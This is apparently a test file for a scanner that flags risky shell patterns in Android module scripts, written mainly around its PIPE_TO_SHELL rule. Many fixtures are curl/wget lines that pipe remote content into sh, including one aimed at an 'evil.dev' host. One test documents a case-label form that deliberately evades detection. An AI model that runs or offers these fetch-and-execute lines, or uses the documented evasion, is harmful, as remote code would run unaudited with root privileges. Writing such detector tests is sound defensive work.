    '    if "$DOWNLOADER" -L --fail -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null; then',
    'sh "$ZIP_PATH.tmp"')), [], '$DOWNLOADER 的末段是 DOWNLOADER：穿透 if 之后仍然不认');
  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
    '    if [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null; then',
    'sh /data/local/tmp/kb.bin')), [], '命令位是 bounded ⇒ 整段词全是参数；本轮没把它做掉');
});

// ===========================================================================
// Task 3.3 —— PIPE_TO_SHELL 的左边界收 shell 控制词（生产上今天就在的那一格）
// ===========================================================================
// 需求来源：工单 `briefs/task-3.3.md` §2/§3；背景 = 计划 §0.19 + task-3.2-report.md §4 +
// task-3.1-report.md §9。那张七行复现表是在 **main 那份 shipped 代码**上跑的；本会话在 455ca04 上
// 用 `p5-t33-run/probe-before.mjs` 逐形重跑，改前实际值与它一致（正面每一形 PIPE_TO_SHELL=0、
// 整包 low/auto-approve，只有 `true && …` 那一形是 high/block）。
//
// **本轮的性质要说准（工单 §0，报告里同一节）**：这是「洞今天开着、但样本里没人用它」。
// 13 真包 + 5 老包的解包树里「控制词前缀的管道写法」实测 **0 处**（全程静态读，没执行任何包内脚本）
// ⇒ 本轮预期翻转的包数 = 0，不会有正经包因为这一改进人工队列。
// 它是「在别人用上之前把门闭上」，不是「抓到现在的某个包」—— 不许写成拦截战果。
//
// 夹具形状一律用工单/计划给的**逐字形状**（`if curl -s https://x.dev/a | sh` 那一族），不换合成写法。
// 断言口径沿用 T3：每条都 deepEqual 到精确 findings 多重集合，不写 some(...)。
const T33_SHE = '#!/system/bin/sh';
const t33body = (...lines) => lines.join('\n') + '\n';
const t33pipe = (text) => hits('PIPE_TO_SHELL', text, 'service.sh').map((f) => `${f.line}/${f.severity}`).sort();
const t33dte = (text) => hits('DOWNLOAD_THEN_EXEC', text, 'service.sh').map((f) => `${f.line}/${f.severity}`).sort();
/** 工单 §3：正面每一形都要「文本层 1 命中 PIPE_TO_SHELL/high」**且**「整包 high/block」—— 两个层次各自钉死。 */
const T33_POSITIVE = [
  // [形状名, service.sh 的那些行（第一行是 shebang）, 管道那一行的精确落点]
  ['if', ['if curl -s https://x.dev/a | sh'], '2/high'],
  ['while', ['while curl -s https://x.dev/a | sh; do', '  break', 'done'], '2/high'],
  ['until', ['until curl -s https://x.dev/a | sh; do', '  break', 'done'], '2/high'],
  ['for', ['for curl -s https://x.dev/a | sh'], '2/high'],
  ['time', ['time curl -s https://x.dev/a | sh'], '2/high'],
  ['!', ['! curl -s https://x.dev/a | sh'], '2/high'],
  ['else', ['if :; then', '  :', 'else curl -s https://x.dev/a | sh'], '4/high'],
  ['then', ['if :; then curl -s https://x.dev/a | sh', 'fi'], '2/high'],
  ['组合 if !', ['if ! curl -s https://x.dev/a | sh; then', '  ui_print "- fail"', 'fi'], '2/high'],
  ['if wget -qO-', ['if wget -qO- https://x.dev/a | sh; then', '  :', 'fi'], '2/high'],
  ['缩进 if（真包形状）', ['    if curl -s https://x.dev/a | sh; then', '      ui_print "- ok"', '    fi'], '2/high'],
];

test('T3.3-A1 正面（工单 §3 那十形）：控制词前缀的管道必须 1 命中 PIPE_TO_SHELL/high，整包 high/block', async () => {
  let i = 0;
  for (const [label, lines, want] of T33_POSITIVE) {
    const t = t33body(T33_SHE, ...lines);
    assert.deepEqual(t33pipe(t), [want],
      `${label}：管道那一行必须恰好 1 条 PIPE_TO_SHELL/high（把控制词从新左边界里摘掉 = 变异 M1，红在这一格）`);
    const r = await t3scan(`eval.t33a${i++}`, t);
    assert.deepEqual(t3spots(r, 'PIPE_TO_SHELL'), [`service.sh:${want}`], `${label}：报告里的落点与文本层一致`);
    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high'], `${label}：整包 findings 多重集合`);
    assert.equal(r.riskLevel, 'high', `${label}：整包等级`);
    assert.equal(r.decision.action, 'block', `${label}：这一形改前是 low/auto-approve —— 闭的就是走机器人自动合并那一格`);
  }
});

test('T3.3-A2 正面（本轮新增的那一格）：elif 前缀的管道必须命中，且命令位也同步穿透（表只有一张）', async () => {
  // `elif curl … | sh` 是 if/while 那一族的自然写法，POSIX 保留字。工单 §2：补它必须**同时**改
  // T3.2-D1 那张逐字清单 —— 把 elif 从表里摘掉（变异 M2）时，这里和 D1 两条一起红。
  const t = t33body(T33_SHE, 'if :; then', '  :', 'elif curl -s https://x.dev/a | sh; then', '  :', 'fi');
  assert.deepEqual(t33pipe(t), ['4/high'], 'elif 那一行必须命中（摘掉 elif 时这一格必红 = 变异 M2）');
  const r = await t3scan('eval.t33b', t);
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', 'elif 不许成为新的自动放行入口');
  // 同一张表服务两处：elif 进了表 ⇒ 命令位那边也穿透它（左边界读的是表，不是抄本）
  assert.equal(t32cmd(t, 4), 'curl', 'elif 之后那个词才是这条逻辑行的命令');
});

// —— §3 反面：一条都不许多，且整包结论不许变松 ——

test('T3.3-B1 反面·对照（工单 §3 反 1）：`true && curl … | sh` 既有口径本来就命中，本轮没改它', async () => {
  const t = t33body(T33_SHE, 'true && curl -s https://x.dev/a | sh');
  assert.deepEqual(t33pipe(t), ['2/high'], '`&&` 那一支走的是语句边界符，与本轮新增的控制词一支无关');
  const r = await t3scan('eval.t33c', t);
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
  assert.equal(r.decision.action, 'block', '改前改后同一个结论（工单 §0 复现表最后一行）');
});

test('T3.3-B2 反面（工单 §3 反 2）：引号里/注释里的散文不许被当成管道行', () => {
  // 新左边界要求控制词**整词**站在语句起点上（行首或语句边界符之后）且后面真的跟着空白：
  //   * `ui_print "if curl x | sh …"` —— `if` 前面是引号，不是边界符 ⇒ 0；
  //   * `# 说明：if curl … | sh …` —— 行首是 `#`，`^\s*` 之后那个词不是控制词 ⇒ 0；
  //   * `ui_print "- 提示：case curl … | sh …"` —— 同理，而且 `|` 后面那个词是 `sh` 不是下载器 ⇒ 0。
  // 「任意单词后都算」的过宽版左边界（变异 M3）红在这三条上。
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'ui_print "if curl x | sh 是禁止的写法"')), [],
    '引号里的散文：0 命中（工单给的逐字形状）');
  assert.deepEqual(t33pipe(t33body(T33_SHE, '# 说明：if curl -s https://x.dev/a | sh 这种写法禁止')), [],
    '整行注释里的散文：0 命中');
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'ui_print "- 提示：case curl -s https://x.dev/a | sh 在别处是禁止的"')), [],
    '引号里的第二形：控制词在引号里也一样不许被当成命令位');
  // 对照（工单 §3 反 2 括号里那句「`exclude: /^\s*#/` 那一支行为不变」）：那条行级注释豁免住在别的规则里，
  // 本轮一个字没动 —— 注释豁免是那些规则自己的口径，PIPE_TO_SHELL 不靠它（也不许顺手加一个）。
  const comment = t33body(T33_SHE, '# unzip -q -d $MODPATH /sdcard/p.zip');
  const notComment = t33body(T33_SHE, 'unzip -q -d $MODPATH /sdcard/p.zip');
  assert.equal(hits('MODDIR_RUNTIME_WRITE', comment, 'service.sh').length, 0, '既有注释豁免：0 命中，行为不变');
  assert.equal(hits('MODDIR_RUNTIME_WRITE', notComment, 'service.sh').length, 1, '同一行去掉注释符照旧命中：豁免还是那条豁免');
});

test('T3.3-B3 反面（工单 §3 反 3）：只有落盘没有管道 ⇒ PIPE_TO_SHELL 0，由 DOWNLOAD_THEN_EXEC 那一族说话', () => {
  // 工单 §2 明令本轮不许把两族并起来：左边界加宽只加在**管道**那一支的左边。
  const plain = t33body(T33_SHE,
    'curl -s https://x.dev/a -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u');
  assert.deepEqual(t33pipe(plain), [], '没有管道 ⇒ PIPE_TO_SHELL 必须 0');
  assert.deepEqual(t33dte(plain), ['4/high'], '落盘那一族的口径一字未动');
  const prefixed = t33body(T33_SHE,
    'if curl -s https://x.dev/a -o /data/local/tmp/u',
    'chmod 700 /data/local/tmp/u',
    '/data/local/tmp/u');
  assert.deepEqual(t33pipe(prefixed), [], '控制词前缀 + 落盘（没有管道）：左边界加宽不许把它读成直连执行');
  // 顺带钉住一个**既有**事实（本轮没动它）：DOWNLOAD_THEN_EXEC 的 sink 侧要求段首那个词就是下载器
  //（`dteCollectSinks` 读的是 `seg[0]`，不是逻辑行的命令位）⇒ `if curl … -o 路径` 这一格今天就不立 sink，
  // 与 task-3.1-report.md §9.1、T3.2-D3 钉的是同一格。所以这里两个族都是 0 —— 不是「换一族来说话」。
  assert.deepEqual(t33dte(prefixed), [], 'sink 侧的段首口径一字未动：if 前缀那一格仍然不立 sink（既有限度）');
});

test('T3.3-B4 反面（工单 §3 反 4）：case 打头那一行与 curl)/wget) 标签都不是命令位 ⇒ 0 命中', () => {
  // 形状取自真包 AlwaysStrong keybox_fetch.sh:83-88 的 run_engine（`case "$1" in` + `curl)`/`wget)` 标签，
  // 逐字见 T3.1-C1）。标签**右边那半句**是夹具补的管道写法 —— 真包那两行的落盘目标是位置参数 `$3`
  //（task-3.1-report.md §8.4），补它是为了把「左边界」这一半单独拎出来观察。
  // 与 task-3.1 §9 那条 case 标签夹具不重复：那条钉的是「标签不立 sink」（DOWNLOAD_THEN_EXEC），
  // 这条钉的是「标签不是 PIPE_TO_SHELL 的左边界」。
  const block = t33body(T33_SHE,
    '    case "$TOOL" in',
    '        curl)    busybox wget -qO- https://x.dev/a | sh ;;',
    '        wget)    busybox wget -qO- https://x.dev/b | sh ;;',
    '    esac');
  assert.deepEqual(t33pipe(block), [],
    '`case` 打头那一行本身不该命中；`curl)`/`wget)` 是标签，标签不是命令（过宽版 = 变异 M3 红在这儿）');
  assert.deepEqual(t33dte(block), [], '两族都不报：标签行既不立 sink（T3.1-C1 已钉），也不是管道左边界');
  const oneLine = t33body(T33_SHE, '    case "$TOOL" in curl) busybox wget -qO- https://x.dev/a | sh ;; esac');
  assert.deepEqual(t33pipe(oneLine), [], '同一族的一行式写法：`in` 不在表里，`curl)` 也不是控制词 ⇒ 仍然 0');
  // 活体检测：`case` 确实在表里（它打头 + 紧跟下载器时左边界是认的），上面那两个 0 不是因为整条支路失效
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'case curl -s https://x.dev/a | sh')), ['2/high'],
    '`case` 站在语句起点上时它就是一个控制词 —— 标签那一格与它是两件事');
  // 反面对照：同一载荷把下载器放到**真**语句边界符之后 ⇒ 规则看得见它
  assert.deepEqual(t33pipe(t33body(T33_SHE, '    case "$TOOL" in curl) esac; busybox wget -qO- https://x.dev/a | sh')), ['2/high'],
    '边界符那一支照旧：上面 0 是判据在筛，不是规则没看见');
});

// —— §3 不变量：只动左边界，其余一字不动 ——

test('T3.3-C1 不变量：severity/category/title/advice 与管道右半、`<(` 那一支一字未动', () => {
  const r = RULES_BY_ID.PIPE_TO_SHELL;
  assert.equal(r.severity, 'high', '工单 §2：severity 不动');
  assert.equal(r.category, 'dangerous', '工单 §2：category 不动');
  assert.equal(r.anchor, 'anywhere', '锚点声明不动（闭包表继续按「x=1; 」前缀验它）');
  assert.equal(r.title, '下载内容直连 shell 执行（curl|sh / wget|sh）', '文案不动：本轮没换主张，只换左边界');
  assert.equal(r.advice, '禁止。远程内容可在 root 下任意执行且无法审计，必须先落盘、校验校验和，再执行。', 'advice 不动');
  const src = r.pattern.source;
  // 右半逐段对账（改前的 pattern.source 里就是这些字节，本轮只在**左边**加）
  assert.ok(src.includes('\\b[^\\n|]*\\|[^\\n]*\\b(?:sh|bash|ash|ksh|zsh|python3?|perl|su)\\b'),
    `sink 词表那半边被改到了：${src}`);
  assert.ok(src.includes('(?:curl|wget|busybox\\s+wget|busybox\\s+curl)'), `下载器写法面被改到了：${src}`);
  assert.ok(src.includes('\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b'), `第二支 <( 被改到了：${src}`);
  // Task 3.4 把 `^` 收成 `^\s*`（缩进裸写的管道就是本轮要闭的那一格），所以这颗钉子跟着换成收缩后的新前缀；
  // 右半三段照旧逐字对账（上面三条 includes 一字未动 —— 标签豁免的负向前瞻拼在下载器组与 `\b` **之间**，
  // 右半的字节面没有被切开，工单 §2「右半三段照旧逐字对账」要的就是这个字节面）。
  assert.ok(src.startsWith('(?:^\\s*|[|;&`(]\\s*|'), `第一支（Task 3.4 收缩后的左边界）必须是新前缀：${src}`);
  // 行为层对账：改前改后同一个值的几形
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'], '第二支 `<(` 那一支照旧');
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl http://a.b | busybox sh')), ['2/high'], 'sink 词表那一半照旧');
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'wget -O- http://1.2.3.4/x | bash')), ['2/high'], '标准输出形态照旧');
});

test('T3.3-C2 不变量：纯函数、maxPerFile、一行一条的基数都没被新左边界带着动', () => {
  const one = t33body(T33_SHE, 'if curl -s https://x.dev/a | sh');
  assert.equal(JSON.stringify(RULES_BY_ID.PIPE_TO_SHELL.scan('service.sh', one)),
    JSON.stringify(RULES_BY_ID.PIPE_TO_SHELL.scan('service.sh', one)),
    '两次同输入必须同结果（左边界是新写的，纯函数是既有契约）');
  // maxPerFile=20：30 行同形状 ⇒ 仍然按**行**收敛到 20，一条都不许多
  const many = t33body(T33_SHE, ...Array.from({ length: 30 }, (_, k) => `if curl -s https://x.dev/a${k} | sh`));
  assert.equal(hits('PIPE_TO_SHELL', many, 'service.sh').length, 20, 'maxPerFile 没动');
  // fix3-P7 契约 1：一行两处管道 ⇒ 基数仍然「一行最多一条」
  assert.equal(hits('PIPE_TO_SHELL', t33body(T33_SHE,
    'if curl -s https://x.dev/a | sh; wget -qO- https://x.dev/b | bash'), 'service.sh').length, 1,
    '新左边界不许把一行拆成两条发现');
  // counts 去重键（ruleId@file:line）与 severity 口径不变
  assert.deepEqual(T33_POSITIVE.slice(0, 2).map(([, lines, want]) => want), ['2/high', '2/high'],
    '夹具自身的口径核对：正面两形都落在第 2 行');
});

test('T3.3-D1 形状：左边界读的就是那张具名表 —— pattern 里不许手写控制词字面量', () => {
  // 工单 §2 新增的那半条不变量：允许被共享层左边界读，但**不许在 pattern 里手写控制词**。
  // 判据（runtime，比读源码字符串更强）：每一个控制词在 PIPE_TO_SHELL 的 pattern.source 里
  // 只能作为「表展开出来的那一段」出现一次；谁手写一份第二张表进 pattern，这里当场数出两次。
  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  const words = /const SHELL_CONTROL_WORDS = new Set\(\[([^\]]*)\]\)/.exec(src)[1]
    .split(',').map((s) => s.trim().replace(/^'|'$/g, '')).filter(Boolean);
  assert.ok(words.includes('elif'), 'elif 必须在表里（工单 §2）');
  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
  for (const w of words.filter((x) => /^[a-z]+$/.test(x))) {
    const n = (pattern.match(new RegExp(`(?:^|[^a-z])${w}(?:[^a-z]|$)`, 'g')) || []).length;
    assert.equal(n, 1, `控制词 ${w} 在 pattern 里只许出现一次（来自那张表的展开）：出现 ${n} 次 = 有人手抄了一份`);
  }
  // 新左边界里那个「控制词序列」必须是**可重复**的（组合形 `if ! curl … | sh` 靠它），且不许有别的词表来源
  const leftPart = pattern.slice(0, pattern.indexOf('(?:curl|wget'));
  assert.ok(leftPart.includes(')+'), '控制词那一支必须是重复形：组合形 if ! curl … | sh 靠它');
});

test('T3.3-D2 观察（Task 3.4 已闭）：缩进的裸 `curl … | sh` 现在是 1 命中 —— 左边界收缩进缩进', () => {
  // 跑实验量出来的另一格：改前 `^` 那一支后面没有 `\s*`，所以**行首带缩进**的裸管道当时也不命中。
  // T3.3 那轮它只是观察（工单 §2 当时不许动，钉在这儿免得下一轮把它读成「已经接住」）；
  // Task 3.4 把 `^` 收成 `^\s*` ⇒ 这一格已闭，期望从 0 翻成 1（工单 §2 授权的唯一翻期望）。
  // **这条夹具本体不许删** —— 它是这格历史上曾经漏检的证据（33fc2f2 钉下的逐字观察原文还在下面）。
  assert.deepEqual(t33pipe(t33body(T33_SHE, '    curl -s https://x.dev/a | sh')), ['2/high'],
    '缩进 + 裸管道：改前 0（这条就是当初那格观察），Task 3.4 收缩进之后是 1 命中');
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl -s https://x.dev/a | sh')), ['2/high'],
    '同一形状不带缩进照旧命中：收缩进没有动顶格那一支的行为');
  // 同一族的另一格（工单 §2 明令 `sh -c <(curl …)` 那一支不动）：第二支要求解释器**紧跟** `<(`，
  // 所以 `sh -c <(curl …)` 今天不命中。改前改后同一个值，钉在这儿免得下一轮把它读成「已经接住」。
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh -c <(curl -s https://x.dev/a)')), [],
    '`<(` 那一支的中间多一个 `-c` 就不命中 —— 本轮没动那一支，这是既有限度不是新洞');
  assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'],
    '去掉 `-c` 那一格照旧命中：上面那个 0 是那一支自己的形状，不是规则整体失效');
  // 真包活体（本轮收缩进就是为了它）：entware-installer-for-magisk-master/customize.sh:142 逐字
  //   '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh'
  // 改前 0 命中、整包 low/auto-approve 的是**这一格本身**（工单 §0 表 P1；整包 high/block 是别的规则说的）；
  // Task 3.4 之后 1 命中 ⇒ 这格终于被报出来（18 包差集 −0/+1 加的就是它，逐字夹具见 T3.4-A1）。
  const entware142 = '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh';
  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142)), ['2/high'],
    '真包那一行：改前就是这条观察的 0，Task 3.4 闭掉 ⇒ 1 命中');
  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142.trim())), ['2/high'],
    '同一行去掉行首缩进照旧命中：闭进来的那一格与既有那一格现在是同一个判据');
});

// ===========================================================================
// Task 3.4 —— PIPE_TO_SHELL 收缩进缩进裸写 + case 标签豁免
// ===========================================================================
// 需求来源：工单 `briefs/task-3.4.md` §2/§3。背景：计划 §0.20（`60edb58` 的打桩数据）、
// task-3.3-report.md（D2 那一格观察）、台账「2026-10-14 同日第四批」。
// 性质两条都不许漏（工单 §0）：
//   ① 「远程脚本直接喂给 shell」这条最硬的禁令，在**缩进写法**上 main 今天完全不咬 ⇒ 加严；
//   ② N6（顶格 `curl)`／`wget)` 标签行被当成命令）是 main 与分支今天都在误报的一格 ⇒ 本轮的
//      标签豁免把它闭掉 —— 放宽的只有「标签不是命令」这一格，18 包实测 −0，没有任何真包因它翻结论。
// 改前实际值（本会话在副本 4582970 上用 `probe-laneA.mjs` 逐形实测，与工单 §0 两张表逐格一致）：
//   A1/A2/A3/A4/D2 缩进裸写 = 0 命中、整包 low/auto-approve；A6 = 0（缩进裸写的另一形）；
//   A5 = 1（走 `<(` 第二支，改前就咬）；N1–N5 = 0；N6 = 1/high、整包 high/block；E1 = 0、low/auto-approve。
// 断言口径与 T3/T3.3 相同：每条 deepEqual 到**精确 findings 多重集合**，不写 some(...)。
const T34_LINE = {
  a1: '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh',
  a2: '    curl -sL "http://bin.entware.net/a/generic.sh" | sh',
  a3: '  curl -s https://x.dev/a | sh',
  a4: '        busybox wget -qO- https://x.dev/a | sh',
  a5: '    sh <(curl -s https://x.dev/a)',
  a6: '    curl -s https://x.dev/a -o /dev/null (echo) | sh',
  n1: '        curl)    busybox wget -qO- https://x.dev/a | sh ;;',
  n2: '        wget)    busybox wget -qO- https://x.dev/b | sh ;;',
  n3: '    case "$TOOL" in curl) busybox wget -qO- https://x.dev/a | sh ;; esac',
  n4: '    ui_print "curl -s https://x.dev/a | sh 是禁止的写法"',
  n5: '    # curl -s https://x.dev/a | sh',
  n6: 'curl) busybox wget -qO- https://x.dev/a | sh ;;',
  e1: '    curl) curl -s https://evil.dev/x | sh ;;',
};

// —— §3 正面：每条 1 命中 PIPE_TO_SHELL/high + 整包 high/block ——

async function t34positive(key, extra) {
  const line = T34_LINE[key];
  assert.deepEqual(t33pipe(t33body(T33_SHE, line)), ['2/high'],
    `${key}：缩进裸写的管道必须恰好 1 条 PIPE_TO_SHELL/high（左边界退回顶格 ^ = 变异 M2，红在这一格）`);
  const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
  assert.deepEqual(t3spots(r, 'PIPE_TO_SHELL'), ['service.sh:2/high'], `${key}：报告落点与文本层一致`);
  assert.deepEqual(t3set(r), extra, `${key}：整包 findings 多重集合逐条钉死`);
  assert.equal(r.riskLevel, 'high', `${key}：整包等级`);
  assert.equal(r.decision.action, 'block', `${key}：这一形改前是 low/auto-approve —— 闭的就是机器人自动合并那一格`);
  return r;
}

test('T3.4-A1 正面（真包逐字，工单 §0 P1 / §3 A1）：entware customize.sh:142 的 4 空格缩进裸管道 ⇒ 1 命中 + 整包 high/block', async () => {
  // arbv/entware-installer-for-magisk-master/customize.sh:142 逐字（行首 4 个空格）。
  // 改前 0 命中、整包 low/auto-approve 的是**这一格**（工单 §0 表 P1）；整包 high/block 是别的规则说的
  // —— 本轮战果是「这格终于被报出来了」，不是「拦住了一个新包」（工单 §4.8 的口径）。
  // 改前该合成包 set=['DOWNLOAD_TO_STDOUT/low','NETWORK_FETCH/low']（probe-laneA 实测），改后加一条 PIPE_TO_SHELL/high。
  await t34positive('a1', ['DOWNLOAD_TO_STDOUT/low', 'NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

test('T3.4-A2 正面（工单 §0 P2）：curl -sL 版缩进 ⇒ 1 命中 + 整包 high/block', async () => {
  await t34positive('a2', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

test('T3.4-A3 正面（工单 §0 P3）：缩进两格的裸管道 ⇒ 1 命中 + 整包 high/block', async () => {
  await t34positive('a3', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

test('T3.4-A4 正面（工单 §3 A4）：缩进 8 格 + busybox wget -qO- ⇒ 1 命中 + 整包 high/block', async () => {
  await t34positive('a4', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

test('T3.4-A5 正面（工单 §3 A5 交叉形）：缩进的 `sh <(curl …)` 仍 1 命中 —— 走 `<(` 第二支，本轮没碰它', async () => {
  // 工单 §2：第二支一字不动。这一形的 1 命中改前改后同值（probe 实测改前就是 ['2/high']），
  // 它钉的是「收缩进 + 豁免都没把 `<(` 那一支碰歪」，不是本轮的新捕获。
  await t34positive('a5', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

test('T3.4-A6 正面（工单 §3 A6）：标签豁免不许外溢 —— `)` 出现在下载器后面远处时照旧命中', async () => {
  // `    curl -s https://x.dev/a -o /dev/null (echo) | sh`：`)` 不紧跟下载器 ⇒ 豁免不许咬这一格。
  // 工单 §3 明令「跑出来是多少就钉多少，不许为了让它绿而改判据」—— 改前（无收缩进）= 0，
  // 打桩态与实现态实测都是 1/high（probe-laneA.mjs 两份输出逐字可查），钉成 1。
  await t34positive('a6', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
});

// —— §3 反面：一条都不许多，且整包结论不许变松 ——

test('T3.4-B1 反面（工单 §0 N1/N2，B4 那两行在缩进这一格重新钉一遍）：缩进标签行 0 命中，整包结论一字不变', async () => {
  // 这两形在 T3.3-B4 的块状夹具里已经钉过，但那一处没单独走整包结论，本轮收缩进之后
  // 标签行**第一次**站在了 `^\s*` 左边界上 —— 全靠紧跟 `)` 的豁免回到 0（摘掉豁免 = 变异 M1，红在这里）。
  // 改前实测（probe-laneA，分支 4582970）：两形都是 pipe=0、set=['NETWORK_FETCH/low']、low/auto-approve；
  // 「不许变松」钉的就是这四个值改前改后逐字相同。
  for (const key of ['n1', 'n2']) {
    const line = T34_LINE[key];
    assert.deepEqual(t33pipe(t33body(T33_SHE, line)), [], `${key}：标签不是命令，收缩进之后仍必须 0 命中（豁免被摘 = 变异 M1 红在此）`);
    const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], `${key}：整包 findings 一条都不许多`);
    assert.equal(r.riskLevel, 'low', `${key}：改前就是 low —— 结论不许因此轮变松或变紧`);
    assert.equal(r.decision.action, 'auto-approve', `${key}：改前改后同一个结论（工单 §0 表 N1/N2 分支列全 0）`);
  }
});

test('T3.4-B2 反面（工单 §0 N3/N4/N5）：一行式 case、引号里散文、缩进纯注释 ⇒ 收缩进之后照旧 0 命中', async () => {
  // N3 一行式 case：`in` 不在控制词表里、`curl)` 是标签、`busybox wget` 前面没有语句边界 ⇒ 0。
  // N4/N5：引号与 `#` 都不是左边界字符，`^\s*` 收缩进只接**空白**，不接 `"` 或 `#` ⇒ 0。
  // 三条改前改后同值（probe-laneA 两份输出），整包都只有 NETWORK_FETCH/low。
  for (const key of ['n3', 'n4', 'n5']) {
    const line = T34_LINE[key];
    assert.deepEqual(t33pipe(t33body(T33_SHE, line)), [], `${key}：必须还是 0（收缩进或豁免哪一半做宽了都会红在这里）`);
    const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], `${key}：整包 findings 一条都不许多`);
    assert.equal(r.riskLevel, 'low');
    assert.equal(r.decision.action, 'auto-approve');
  }
});

test('T3.4-B3 反面（工单 §0 N6，本轮顺手闭掉的那格误报）：顶格 `curl)` 标签改后 0 命中', async () => {
  // 改前实测（本会话与主控一致，工单 §0 表 N6 行）：**main（shipped）与分支 4582970 都是 1/high、整包 high/block** ——
  // 顶格的 `curl)`／`wget)` 标签行被既有 `^` 左边界当成命令，这是今天就在误报的一格。
  // 本轮的标签豁免把它闭掉（放宽的只有「标签不是命令」这一格；18 包实测 −0，没有真包因它翻结论）。
  // 摘掉豁免（变异 M1）⇒ 这一格回到 1/high 当场红 —— 证明豁免在咬，而且顶格支与缩进支共用同一条前瞻。
  assert.deepEqual(t33pipe(t33body(T33_SHE, T34_LINE.n6)), [],
    'N6：顶格标签改前是 1/high（main 与分支同值，见注释），Task 3.4 之后必须是 0');
  const r = await t3scan('eval.t34n6', t33body(T33_SHE, T34_LINE.n6));
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], 'N6：改后整包只剩 NETWORK_FETCH/low —— 误报的高等级来源没了');
  assert.equal(r.riskLevel, 'low', 'N6：改前 high（误报），闭掉后 low —— 这是工单 §0② 授权的那一格放宽');
  assert.equal(r.decision.action, 'auto-approve', 'N6：改前 block（误报拦下的正当标签行）');
});

// —— §3 观察：不修，交回主控 ——

test('T3.4-E1 观察（不修，交回主控）：缩进 `curl)` 标签后面接真管道仍然 0 —— 豁免判据新开的一条逃逸道', async () => {
  // `    curl) curl -s https://evil.dev/x | sh ;;` —— 标签形状**后面**跟着真下载真管道。
  // 左边界要求下载器词站在 `^\s*` 或边界符/控制词之后：第二个 `curl` 前面是 `curl) `，`)` 与空格都不是边界符；
  // 第一个 `curl` 又被豁免前瞻挡掉 ⇒ 0 命中、整包 low/auto-approve（工单 §3 给的期望，probe 实测一致）。
  // 这是收缩进 + 标签豁免**新开**的逃逸道：上一轮的左边界根本不认缩进，这一格连形状都不成立。
  // 本轮不收它：收了（比如「标签后面再出现下载器就翻回命中」）就等于把 N1/N2/N6 那格误报再开回去——
  // 判据在「豁免紧跟 `)`」与「豁免后面接命令」之间是同一格形状的两侧。写进报告「新开的一条逃逸道」一节。
  assert.deepEqual(t33pipe(t33body(T33_SHE, T34_LINE.e1)), [],
    'E1：逃逸道按工单 §3 保持漏检 —— 期望值就是 0，改动它 = 越出授权范围');
  const r = await t3scan('eval.t34e1', t33body(T33_SHE, T34_LINE.e1));
  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], 'E1：整包只有 NETWORK_FETCH/low（工单 §3：0 / low / auto-approve）');
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'auto-approve');
});

// —— §3 不变量：豁免是具名单一常量、只出现一次；左边界形状对账 ——

test('T3.4-C1 不变量：CASE_LABEL_GUARD 是具名单一常量，且在 pattern.source 里逐字面量只出现一次', () => {
  // 工单 §2：「只许出现一次：两处都加 = 两份口径，早晚分叉」—— 按 pattern.source 数字面量出现次数 = 1。
  // 第二支 `<(` 没有标签形状 ⇒ 那里必须没有前瞻。
  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
  assert.equal((src.match(/const CASE_LABEL_GUARD =/g) || []).length, 1, '豁免判据必须是**具名单一常量**（声明恰好一次）');
  assert.equal((src.match(/\$\{CASE_LABEL_GUARD\}/g) || []).length, 1, '它只许被拼进 pattern **一次**（两处都加 = 两份口径）');
  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
  const needle = '(?!\\s*\\))'; // pattern.source 里的字节面：(?!\s*\))
  assert.equal(pattern.split(needle).length - 1, 1, `豁免前瞻在 pattern.source 里只许出现一次：${pattern}`);
  assert.equal(pattern.split('(?!').length - 1, 1, '整个 pattern 里负向前瞻只许这一条（不许顺手藏第二条）');
});

test('T3.4-C2 不变量：左边界收缩进第一支，SHELL_STATEMENT_START 与 `<(` 第二支的字节面一字未动', () => {
  // 工单 §2：`^\s*` 只加在第一支（`SHELL_STATEMENT_START` 里本来就有 `^\s*`，那一支不动）；
